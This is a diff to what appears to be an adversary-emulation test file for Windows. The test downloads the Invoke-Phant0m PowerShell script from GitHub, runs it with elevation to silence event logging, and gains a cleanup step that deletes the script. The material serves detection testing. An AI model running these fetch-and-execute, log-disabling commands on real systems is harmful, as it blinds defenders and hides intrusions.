@@ -29,7 +29,7 @@ atomic_tests:
   supported_platforms:
   - windows
   executor:
-    command: |-
+    command: |
       Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
       $url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
       $output = "$env:TEMP\Invoke-Phant0m.ps1"
@@ -38,8 +38,9 @@ atomic_tests:
       cd $env:TEMP
       Import-Module .\Invoke-Phant0m.ps1
       Invoke-Phant0m
-    cleanup_command: |-
+    cleanup_command: |
       Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" -fore red
+      Remove-Item "$env:TEMP\Invoke-Phant0m.ps1" -ErrorAction Ignore
     name: powershell
     elevation_required: true
 - name: 'Impair Windows Audit Log Policy'
